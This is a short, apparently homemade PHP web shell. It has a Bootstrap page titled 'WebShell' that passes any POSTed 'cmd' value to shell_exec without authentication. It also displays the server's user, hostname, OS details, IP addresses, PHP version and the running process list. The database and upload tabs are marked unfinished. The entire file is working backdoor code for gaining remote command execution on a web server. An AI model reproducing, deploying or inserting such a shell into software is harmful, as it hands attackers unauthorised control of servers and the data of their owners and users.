<?php
$x = "";
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}

else if(empty($_POST['cmd'])) {
    $cmd="aa";
}

?>
<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <link rel="stylesheet" type="text/css" href="http://localhost/b374k-master/bootstrap-3.3.7-dist/css/bootstrap.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

    <title> WebShell </title>
    
    <style>
        .container {
            width: 850px;
        }
    </style>

</head>

<body>

<div class="container">

    <div class="page-header">
        <h1> Webshell </h1>
</div>
        <form action="" method="POST" enctype="multipart/form-data">

        <div class="form-group">

            <label for="cmd"><?php echo shell_exec("whoami")."@".shell_exec("hostname").shell_exec("pwd")?>:~$</label>
            <input type="text" class="form-control" name="cmd" id="cmd" value="<?php if(!empty($cmd)) { 
                    echo htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8'); } ?>" required>

        </div>
        <button type="submit" class="btn btn-default" onclick="#info">Execute</button>
        </form>

        <ul class="nav nav-tabs">

        <li><a class="btn btn-default" data-toggle="tab" href="#output">Output</a></li>
        <li><a class="btn btn-default" data-toggle="tab" href="#info">Server Information</a></li>
        <li><a class="btn btn-default" data-toggle="tab" href="#ps">Processes</a></li>
        <li><a class="btn btn-default" data-toggle="tab" href="#db">Database</a></li>
        <li><a class="btn btn-default" data-toggle="tab" href="#upload">Upload</a></li>

        </ul>

  <div class="tab-content">
    <div id="output" class="tab-pane fade in active">
        <?php if (isset($cmd)) :  ?>
            <div class="page-header">
                <h3> Output </h3>
            </div>
            <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8'); ?>
    </pre>
        <?php endif; ?>
    </div>


    <div id="info" class="tab-pane fade">
        <div class="page-header">
            <h3> Server Information </h3>
        </div>
        <pre>
<?= "Current User  : " . get_current_user(); ?> <br/>
<?= "Server OS     : " . PHP_OS; ?><br/>
<?= "Server Info   : " . php_uname(); ?> <br/>
<?= "Server IP     : " . gethostbyname($_SERVER["HTTP_HOST"]); ?> <br/>
<?= "Your IP       : " . $s_my_ip = $_SERVER['REMOTE_ADDR']; ?> <br />
<?= "Time @ Server : ".@date("d M Y H:i:s",time());unset($x); ?> <br />
<?= "PHP Version   : ". phpversion();?>
        </pre>
    </div>


    <div id="ps" class="tab-pane fade">
        <div class="page-header">
            <h3> Processes </h3>
        </div>
        <pre>
            <?= shell_exec("ps -aux");?>
        </pre>
    </div>


    <div id="db" class="tab-pane fade">
        <div class="page-header">
            <h3>Database</h3>
        </div>
      <pre>
Underconstruction !!!
      </pre>
    </div>

    <div id="upload" class="tab-pane fade">
        <div class="page-header">
            <h3>File Upload</h3>
        </div>
      <!-- <form action="finalShell.php" method="POST" enctype="multipart/form-data">
        <input type="file" name="fileUpload">
        <input type="submit" value="Upload" class="btn btn-default"> -->
        <pre>
Underconstruction !!!
       </pre>
      </form>
    </div>


  </div>
</div>



</body>

</html>
